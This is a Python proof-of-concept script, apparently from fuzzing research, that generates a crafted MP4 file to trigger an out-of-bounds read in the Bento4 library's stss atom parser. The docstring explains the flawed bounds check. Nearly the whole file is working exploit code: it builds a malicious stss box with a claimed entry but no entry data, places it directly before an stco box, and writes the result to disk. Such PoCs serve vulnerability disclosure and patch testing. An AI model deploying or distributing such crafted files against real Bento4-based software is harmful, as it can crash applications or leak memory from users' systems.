#!/usr/bin/env python3
"""
PoC generator for VULN 004: Bento4 Ap4StssAtom.cpp OOB read
stss box uses AP4_ATOM_HEADER_SIZE=8 instead of AP4_FULL_ATOM_HEADER_SIZE=12
for its bounds check, so with size=16 and entry_count=1 the check passes
even though there are zero bytes of entry data remaining in the box.
The parser then calls stream.Read(buffer, 4) which reads the first 4 bytes
of the NEXT box (stco) and treats them as a sync sample number.
"""
import struct
import os

OUTPUT = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4_h/vuln_004.mp4"


def box(box_type, data):
    """Build a standard MP4 box: size(4B BE) + type(4B) + data"""
    size = 8 + len(data)
    return struct.pack(">I", size) + box_type + data


def full_box(box_type, version, flags, data):
    """Build a FullBox: size(4B BE) + type(4B) + version(1B) + flags(3B) + data"""
    header = struct.pack(">B", version) + struct.pack(">I", flags)[1:]  # 1B version + 3B flags
    return box(box_type, header + data)


# ---- MALICIOUS stss box ----
# Full atom format: size(4) + 'stss'(4) + version(1) + flags(3) + entry_count(4) = 16 bytes
# entry_count=1 but NO actual entry data follows (box ends here)
#
# Bounds check bug (AP4_ATOM_HEADER_SIZE=8 used instead of AP4_FULL_ATOM_HEADER_SIZE=12):
#   Correct:  (16 - 12 - 4) / 4 = 0 < 1  -> should REJECT
#   Actual:   (16 -  8 - 4) / 4 = 1 >= 1 -> PASSES  (BUG)
#
# Allocates array of 1 entry, then reads 4 bytes from stream = first 4 bytes of stco box
stss_payload = struct.pack(">I", 1)  # entry_count = 1
stss = full_box(b"stss", 0, 0, stss_payload)
assert len(stss) == 16, f"stss size should be 16, got {len(stss)}"
print(f"[+] stss box: size={len(stss)}, entry_count=1, NO entry data (malicious)")

# ---- stco: full atom, entry_count=1, chunk_offset=0x00000028 ----
# Its first 4 bytes (the box size) will be read as sync sample number by the stss parser.
# stco size = 4 + 4 + 1 + 3 + 4 + 4 = 20 -> will appear as sample_number=20
stco_payload = struct.pack(">I", 1) + struct.pack(">I", 0x00000028)
stco = full_box(b"stco", 0, 0, stco_payload)
print(f"[+] stco box: size={len(stco)} (first 4 bytes = 0x{len(stco):08x} will be read as sync sample number)")

# ---- stsz: full atom, sample_size=0, sample_count=1, one entry_size=4 ----
stsz_payload = struct.pack(">II", 0, 1) + struct.pack(">I", 4)
stsz = full_box(b"stsz", 0, 0, stsz_payload)

# ---- stsc: full atom, entry_count=1, first_chunk=1, samples_per_chunk=1, sdesc_idx=1 ----
stsc_payload = struct.pack(">I", 1) + struct.pack(">III", 1, 1, 1)
stsc = full_box(b"stsc", 0, 0, stsc_payload)

# ---- stts: full atom, entry_count=1, sample_count=1, sample_delta=1 ----
stts_payload = struct.pack(">I", 1) + struct.pack(">II", 1, 1)
stts = full_box(b"stts", 0, 0, stts_payload)

# ---- stsd: full atom, entry_count=0 ----
stsd = full_box(b"stsd", 0, 0, struct.pack(">I", 0))

# ---- stbl box: stsd + stts + stsc + stsz + stss(malicious) + stco ----
# stco must immediately follow stss so the OOB read hits stco's size bytes
stbl_data = stsd + stts + stsc + stsz + stss + stco
stbl = box(b"stbl", stbl_data)

# ---- smhd: full atom, 16 bytes (balance=0, reserved=0) ----
smhd = full_box(b"smhd", 0, 0, struct.pack(">HH", 0, 0))
assert len(smhd) == 16

# ---- dref with one url entry (self-contained) ----
url_entry = full_box(b"url ", 0, 1, b"")
dref_payload = struct.pack(">I", 1) + url_entry
dref = full_box(b"dref", 0, 0, dref_payload)
dinf = box(b"dinf", dref)

# ---- minf box ----
minf = box(b"minf", smhd + dinf + stbl)

# ---- mdhd: full atom, version=0, 32 bytes total ----
mdhd_payload = struct.pack(">IIII", 0, 0, 44100, 0) + struct.pack(">HH", 0x55C4, 0)
mdhd = full_box(b"mdhd", 0, 0, mdhd_payload)
assert len(mdhd) == 32, f"mdhd length {len(mdhd)}"

# ---- hdlr: full atom, handler_type='soun' ----
hdlr_payload = struct.pack(">I", 0) + b"soun" + b"\x00" * 12 + b"SoundHandler\x00"
hdlr = full_box(b"hdlr", 0, 0, hdlr_payload)

# ---- mdia box ----
mdia = box(b"mdia", mdhd + hdlr + minf)

# ---- tkhd: full atom, version=0, 92 bytes total ----
tkhd_payload = (
    struct.pack(">IIIII", 0, 0, 1, 0, 0) +
    b"\x00" * 8 +
    struct.pack(">hhhh", 0, 0, 0x0100, 0) +
    b"\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
    b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00" +
    b"\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00" +
    struct.pack(">II", 0, 0)
)
tkhd = full_box(b"tkhd", 0, 3, tkhd_payload)
assert len(tkhd) == 92, f"tkhd length {len(tkhd)}"

# ---- trak box ----
trak = box(b"trak", tkhd + mdia)

# ---- mvhd: full atom, version=0, 108 bytes total ----
mvhd_payload = (
    struct.pack(">IIII", 0, 0, 1000, 0) +
    struct.pack(">I", 0x00010000) +
    struct.pack(">H", 0x0100) +
    b"\x00" * 10 +
    b"\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
    b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00" +
    b"\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00" +
    b"\x00" * 24 +
    struct.pack(">I", 2)
)
mvhd = full_box(b"mvhd", 0, 0, mvhd_payload)
assert len(mvhd) == 108, f"mvhd length {len(mvhd)}"

# ---- moov box ----
moov = box(b"moov", mvhd + trak)

# ---- ftyp box: 16 bytes ----
ftyp = box(b"ftyp", b"M4A " + struct.pack(">I", 0))
assert len(ftyp) == 16

# ---- Assemble file ----
mp4 = ftyp + moov

os.makedirs(os.path.dirname(OUTPUT), exist_ok=True)
with open(OUTPUT, "wb") as f:
    f.write(mp4)

print(f"[+] Written {len(mp4)} bytes to {OUTPUT}")
print(f"[+] stss box at offset: 0x{mp4.index(b'stss'):x}")
print(f"[+] stco box at offset: 0x{mp4.index(b'stco'):x}")
print(f"[+] Expected: OOB read — stss reads stco size ({len(stco)}) as sync sample number")
